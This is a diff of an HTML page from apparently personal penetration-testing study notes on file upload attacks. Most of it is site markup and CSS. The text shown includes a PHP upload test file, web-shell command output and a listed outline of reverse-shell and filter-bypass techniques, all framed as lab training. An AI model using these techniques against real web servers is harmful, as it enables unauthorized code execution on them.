aria-hidden="true">3.3.6.</strong> Kubernetes Basics</a></li></ol></li><li class="chapter-item "><a href="../../../../general/networking/index.html"><strong aria-hidden="true">3.4.</strong> Networking</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/networking/networking_introduction.html"><strong aria-hidden="true">3.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../general/networking/cisco/index.html"><strong aria-hidden="true">3.4.2.</strong> Cisco Network Technician</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/networking/cisco/networking_basics.html"><strong aria-hidden="true">3.4.2.1.</strong> Networking Basics</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../../../general/processes/index.html"><strong aria-hidden="true">3.5.</strong> Processes</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/processes/bbh_process.html"><strong aria-hidden="true">3.5.1.</strong> Bug Bounty Hunting Process</a></li><li class="chapter-item "><a href="../../../../general/processes/incident_handling_process.html"><strong aria-hidden="true">3.5.2.</strong> Incident Handling Process</a></li><li class="chapter-item "><a href="../../../../general/processes/pt_process.html"><strong aria-hidden="true">3.5.3.</strong> Penetration Testing Process</a></li></ol></li><li class="chapter-item "><a href="../../../../general/programming/index.html"><strong aria-hidden="true">3.6.</strong> Programming</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/programming/assembly/assembly.html"><strong aria-hidden="true">3.6.1.</strong> Assembly</a></li><li class="chapter-item "><a href="../../../../general/programming/bash.html"><strong aria-hidden="true">3.6.2.</strong> Bash</a></li><li class="chapter-item "><a href="../../../../general/programming/python/python.html"><strong aria-hidden="true">3.6.3.</strong> Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/programming/python/sans573/cheatsheet.html"><strong aria-hidden="true">3.6.3.1.</strong> 573 Cheatsheet</a></li></ol></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">3.7.</strong> RegEx</div></li><li class="chapter-item "><a href="../../../../general/reporting/index.html"><strong aria-hidden="true">3.8.</strong> Reporting</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/reporting/bbh_reporting.html"><strong aria-hidden="true">3.8.1.</strong> Bug Bounty</a></li><li class="chapter-item "><a href="../../../../general/reporting/pt_reporting.html"><strong aria-hidden="true">3.8.2.</strong> Penetration Test</a></li><li class="chapter-item "><a href="../../../../security_incident_reporting.html"><strong aria-hidden="true">3.8.3.</strong> Security Incident</a></li></ol></li><li class="chapter-item "><a href="../../../../general/webdev/index.html"><strong aria-hidden="true">3.9.</strong> WebDev</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/webdev/sylius.html"><strong aria-hidden="true">3.9.1.</strong> Sylius</a></li><li class="chapter-item "><a href="../../../../general/webdev/symfony.html"><strong aria-hidden="true">3.9.2.</strong> Symfony</a></li></ol></li></ol></li></ol>
+            </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
             </div>
         </nav>
 
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
         <div id="page-wrapper" class="page-wrapper">
 
             <div class="page">
-                <div id="menu-bar-hover-placeholder"></div>
+                                <div id="menu-bar-hover-placeholder"></div>
                 <div id="menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
                         <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
@@ -125,14 +129,13 @@
                             <i class="fa fa-paint-brush"></i>
                         </button>
                         <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
-                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                         </ul>
-                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                             <i class="fa fa-search"></i>
                         </button>
                     </div>
@@ -149,12 +152,7 @@
 
                 <div id="search-wrapper" class="hidden">
                     <form id="searchbar-outer" class="searchbar-outer">
-                        <div class="search-wrapper">
-                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
-                            <div class="spinner-wrapper">
-                                <i class="fa fa-spinner fa-spin"></i>
-                            </div>
-                        </div>
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                     </form>
                     <div id="searchresults-outer" class="searchresults-outer hidden">
                         <div id="searchresults-header" class="searchresults-header"></div>
@@ -174,314 +172,7 @@
 
                 <div id="content" class="content">
                     <main>
-                        <style>
-.mdbook-callouts {
-  padding: 8px 16px;
-  margin-bottom: 16px;
-  border-radius: 4px;
-  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
-  background: var(--mdbook-callouts-background);
-}
-
-.mdbook-callouts > *:first-child {
-  margin-top: 0;
-}
-
-.mdbook-callouts > *:last-child {
-  margin-bottom: 0;
-}
-
-.mdbook-callouts-title {
-  display: flex;
-  font-weight: 600;
-  align-items: center;
-  line-height: 1;
-  color: var(--mdbook-callouts-color);
-  text-transform: capitalize;
-}
-
-.mdbook-callouts-icon {
-  display: inline-block;
-  width: 1em;
-  height: 1em;
-  margin-right: 0.2em;
-  background-color: currentColor;
-  -webkit-mask: no-repeat center / 100%;
-  mask: no-repeat center / 100%;
-  -webkit-mask-image: var(--mdbook-callouts-icon);
-  mask-image: var(--mdbook-callouts-icon);
-}
-
-/* icons at: https://lucide.dev/icons/ */
-
-.mdbook-callouts-info {
-  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
-  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
-  /* https://lucide.dev/icons/info */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
-}
-
-.mdbook-callouts-note {
-  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
-  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
-  /* https://lucide.dev/icons/pencil */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
-}
-
-.mdbook-callouts-tip,
-.mdbook-callouts-hint {
-  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
-  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
-  /* https://lucide.dev/icons/flame */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
-}
-
-.mdbook-callouts-important {
-  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
-  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
-  /* https://lucide.dev/icons/alert-circle */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
-}
-
-.mdbook-callouts-success,
-.mdbook-callouts-check,
-.mdbook-callouts-done {
-  --mdbook-callouts-color: rgb(var(--color-green-rgb));
-  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
-  /* https://lucide.dev/icons/check */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-question,
-.mdbook-callouts-help,
-.mdbook-callouts-faq {
-  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
-  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
-  /* https://lucide.dev/icons/help-circle */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-warning,
-.mdbook-callouts-warn {
-  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
-  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
-  /* https://lucide.dev/icons/alert-triangle */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-caution {
-  --mdbook-callouts-color: rgb(var(--color-red-rgb));
-  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
-  /* https://lucide.dev/icons/shield-alert */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-failure,
-.mdbook-callouts-fail,
-.mdbook-callouts-missing {
-  --mdbook-callouts-color: rgb(var(--color-red-rgb));
-  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
-  /* https://lucide.dev/icons/x */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
-}
-
-.mdbook-callouts-error,
-.mdbook-callouts-danger {
-  --mdbook-callouts-color: rgb(var(--color-red-rgb));
-  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
-  /* https://lucide.dev/icons/zap */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
-}
-
-.mdbook-callouts-bug {
-  --mdbook-callouts-color: rgb(var(--color-red-rgb));
-  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
-  /* https://lucide.dev/icons/bug */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-examples,
-.mdbook-callouts-example {
-  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
-  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
-  /* https://lucide.dev/icons/list */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
-}
-
-.mdbook-callouts-quote {
-  --mdbook-callouts-color: rgb(158, 158, 158);
-  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
-  /* https://lucide.dev/icons/quote */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
-}
-
-
-.ayu {
-  --color-red-rgb: 251, 70, 76;
-  --color-red: #fb464c;
-  --color-orange-rgb: 233, 151, 63;
-  --color-orange: #e9973f;
-  --color-yellow-rgb: 224, 222, 113;
-  --color-yellow: #e0de71;
-  --color-green-rgb: 68, 207, 110;
-  --color-green: #44cf6e;
-  --color-cyan-rgb: 83, 223, 221;
-  --color-cyan: #53dfdd;
-  --color-blue-rgb: 2, 122, 255;
-  --color-blue: #027aff;
-  --color-purple-rgb: 168, 130, 255;
-  --color-purple: #a882ff;
-  --color-pink-rgb: 250, 153, 205;
-  --color-pink: #fa99cd;
-}
-
-.light {
-  --color-red-rgb: 233, 49, 71;
-  --color-red: #e93147;
-  --color-orange-rgb: 236, 117, 0;
-  --color-orange: #ec7500;
-  --color-yellow-rgb: 224, 172, 0;
-  --color-yellow: #e0ac00;
-  --color-green-rgb: 8, 185, 78;
-  --color-green: #08b94e;
-  --color-cyan-rgb: 0, 191, 188;
-  --color-cyan: #00bfbc;
-  --color-blue-rgb: 8, 109, 221;
-  --color-blue: #086ddd;
-  --color-purple-rgb: 120, 82, 238;
-  --color-purple: #7852ee;
-  --color-pink-rgb: 213, 57, 132;
-  --color-pink: #d53984;
-}
-
-.coal {
-  --color-red-rgb: 251, 70, 76;
-  --color-red: #fb464c;
-  --color-orange-rgb: 233, 151, 63;
-  --color-orange: #e9973f;
-  --color-yellow-rgb: 224, 222, 113;
-  --color-yellow: #e0de71;
-  --color-green-rgb: 68, 207, 110;
-  --color-green: #44cf6e;
-  --color-cyan-rgb: 83, 223, 221;
-  --color-cyan: #53dfdd;
-  --color-blue-rgb: 2, 122, 255;
-  --color-blue: #027aff;
-  --color-purple-rgb: 168, 130, 255;
-  --color-purple: #a882ff;
-  --color-pink-rgb: 250, 153, 205;
-  --color-pink: #fa99cd;
-}
-
-.navy {
-  --color-red-rgb: 251, 70, 76;
-  --color-red: #fb464c;
-  --color-orange-rgb: 233, 151, 63;
-  --color-orange: #e9973f;
-  --color-yellow-rgb: 224, 222, 113;
-  --color-yellow: #e0de71;
-  --color-green-rgb: 68, 207, 110;
-  --color-green: #44cf6e;
-  --color-cyan-rgb: 83, 223, 221;
-  --color-cyan: #53dfdd;
-  --color-blue-rgb: 2, 122, 255;
-  --color-blue: #027aff;
-  --color-purple-rgb: 168, 130, 255;
-  --color-purple: #a882ff;
-  --color-pink-rgb: 250, 153, 205;
-  --color-pink: #fa99cd;
-}
-
-.rust {
-  --color-red-rgb: 233, 49, 71;
-  --color-red: #e93147;
-  --color-orange-rgb: 236, 117, 0;
-  --color-orange: #ec7500;
-  --color-yellow-rgb: 224, 172, 0;
-  --color-yellow: #e0ac00;
-  --color-green-rgb: 8, 185, 78;
-  --color-green: #08b94e;
-  --color-cyan-rgb: 0, 191, 188;
-  --color-cyan: #00bfbc;
-  --color-blue-rgb: 8, 109, 221;
-  --color-blue: #086ddd;
-  --color-purple-rgb: 120, 82, 238;
-  --color-purple: #7852ee;
-  --color-pink-rgb: 213, 57, 132;
-  --color-pink: #d53984;
-}
-</style>
-<ul>
-<li><a href="#file-upload-attacks">File Upload Attacks</a>
-<ul>
-<li><a href="#absent-validation">Absent Validation</a>
-<ul>
-<li><a href="#arbitrary-file-upload">Arbitrary File Upload</a></li>
-<li><a href="#identifying-web-framework">Identifying Web Framework</a></li>
-<li><a href="#vulnerability-identification">Vulnerability Identification</a></li>
-</ul>
-</li>
-<li><a href="#upload-exploitation">Upload Exploitation</a>
-<ul>
-<li><a href="#web-shells">Web Shells</a></li>
-<li><a href="#writing-custom-web-shell">Writing Custom Web Shell</a></li>
-<li><a href="#reverse-shell">Reverse Shell</a></li>
-<li><a href="#generating-custom-reverse-shell-scripts">Generating Custom Reverse Shell Scripts</a></li>
-</ul>
-</li>
-<li><a href="#client-side-validation">Client-Side Validation</a>
-<ul>
-<li><a href="#back-end-request-modification">Back-End Request Modification</a></li>
-<li><a href="#disabling-front-end-validation">Disabling Front-End Validation</a></li>
-</ul>
-</li>
-<li><a href="#blacklist-filters">Blacklist Filters</a>
-<ul>
-<li><a href="#blacklisting-extensions">Blacklisting Extensions</a></li>
-<li><a href="#fuzzing-extensions">Fuzzing Extensions</a></li>
-</ul>
-</li>
-<li><a href="#whitelist-filters">Whitelist Filters</a>
-<ul>
-<li><a href="#whitelisting-extensions">Whitelisting Extensions</a></li>
-<li><a href="#double-extensions">Double Extensions</a></li>
-<li><a href="#reverse-double-extension">Reverse Double Extension</a></li>
-<li><a href="#character-injection">Character Injection</a></li>
-</ul>
-</li>
-<li><a href="#type-filters">Type Filters</a>
-<ul>
-<li><a href="#content-type">Content-Type</a></li>
-<li><a href="#mime-type">MIME-Type</a></li>
-</ul>
-</li>
-<li><a href="#limited-file-uploads">Limited File Uploads</a>
-<ul>
-<li><a href="#xss">XSS</a></li>
-<li><a href="#xxe">XXE</a></li>
-<li><a href="#dos">DoS</a></li>
-</ul>
-</li>
-<li><a href="#other-upload-attacks">Other Upload Attacks</a>
-<ul>
-<li><a href="#injections-in-file-names">Injections in File Names</a></li>
-<li><a href="#upload-directory-disclosure">Upload Directory Disclosure</a></li>
-<li><a href="#windows-specific-attacks">Windows-specific Attacks</a></li>
-</ul>
-</li>
-<li><a href="#preventing-file-upload-vulnerabilities">Preventing File Upload Vulnerabilities</a>
-<ul>
-<li><a href="#extension-validation">Extension Validation</a></li>
-<li><a href="#content-validation">Content Validation</a></li>
-<li><a href="#upload-disclosure">Upload Disclosure</a></li>
-<li><a href="#further-security">Further Security</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<hr />
-<h1 id="file-upload-attacks"><a class="header" href="#file-upload-attacks">File Upload Attacks</a></h1>
+                        <h1 id="file-upload-attacks"><a class="header" href="#file-upload-attacks">File Upload Attacks</a></h1>
 <p>Uploading a file has become a key feature for most modern web applications to allow the extensibility of web apps with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use.</p>
 <p>However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application's back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it.</p>
 <p>The worst possbile kind of file upload vulnerability is an unauthenticated arbitrary file upload. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.</p>
@@ -503,7 +194,7 @@
 </ul>
 <h3 id="vulnerability-identification"><a class="header" href="#vulnerability-identification">Vulnerability Identification</a></h3>
 <p>To identify whether you can upload arbitrary files (<em>PHP in this case</em>), you can upload the following file:</p>
-<pre><code class="language-php">&lt;?php echo "Hello HTB";?&gt; 
+<pre><code class="language-php">&lt;?php echo &quot;Hello HTB&quot;;?&gt; 
 </code></pre>
 <p>To verify that it worked:</p>
 <p><img src="../../../../images/file_upload2.png" alt="hello htb" /></p>
@@ -532,19 +223,16 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ...SNIP...
 Payload size: 3033 bytes
 </code></pre>
